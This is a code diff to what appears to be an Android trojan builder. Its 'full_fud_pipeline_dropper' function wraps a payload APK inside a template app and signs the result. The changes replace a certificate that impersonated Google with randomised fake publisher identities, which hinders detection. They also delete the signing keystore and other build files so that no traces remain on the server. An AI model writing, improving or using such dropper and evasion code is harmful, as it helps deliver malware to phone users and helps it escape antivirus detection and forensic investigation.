@@ -89,13 +89,36 @@ def _generate_keystore() -> str:
     import datetime
 
     key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
+
+    org_pool = [
+        "CyberLink Solutions", "Nexa Systems", "ByteForge",
+        "Quantum Apps", "DeltaSoft", "Vertex Labs", "Aurora Interactive",
+        "Ironclad Mobile", "Solaris Tech", "Northwind Digital",
+    ]
+    loc_pool = [
+        ("US", "California", "San Jose"),
+        ("US", "Texas", "Austin"),
+        ("US", "Washington", "Seattle"),
+        ("GB", "England", "London"),
+        ("DE", "Berlin", "Berlin"),
+        ("FR", "Ile-de-France", "Paris"),
+        ("NL", "North Holland", "Amsterdam"),
+        ("SE", "Stockholm", "Stockholm"),
+        ("JP", "Tokyo", "Tokyo"),
+        ("CA", "Ontario", "Toronto"),
+    ]
+    country, state, city = random.choice(loc_pool)
+    org = random.choice(org_pool)
+    ou_pool = ["Mobile", "Engineering", "Apps", "Development", "Product", "Client"]
+    cn_pool = ["Android", "Mobile App", "App Developer", "Mobile Client", "Application"]
+
     subject = issuer = x509.Name([
-        x509.NameAttribute(NameOID.COUNTRY_NAME,             "US"),
-        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME,   "California"),
-        x509.NameAttribute(NameOID.LOCALITY_NAME,            "Mountain View"),
-        x509.NameAttribute(NameOID.ORGANIZATION_NAME,        "Google Inc."),
-        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "Android"),
-        x509.NameAttribute(NameOID.COMMON_NAME,              "Android"),
+        x509.NameAttribute(NameOID.COUNTRY_NAME,             country),
+        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME,   state),
+        x509.NameAttribute(NameOID.LOCALITY_NAME,            city),
+        x509.NameAttribute(NameOID.ORGANIZATION_NAME,        org),
+        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, random.choice(ou_pool)),
+        x509.NameAttribute(NameOID.COMMON_NAME,              random.choice(cn_pool)),
     ])
     now = datetime.datetime.utcnow()
     cert = (
@@ -146,6 +169,11 @@ def _sign(unsigned_apk: str, output_apk: str):
 
     if os.path.exists(aligned):
         os.remove(aligned)
+    try:
+        if os.path.exists(ks):
+            os.remove(ks)
+    except Exception:
+        pass
 
 
 def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
@@ -199,7 +227,6 @@ def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
     _step(session_dir, "3/3 sign")
     _sign(unsigned, output_apk)
 
-    # CLEANUP — server pe kuch na bache
     try:
         if os.path.exists(unsigned):
             os.remove(unsigned)
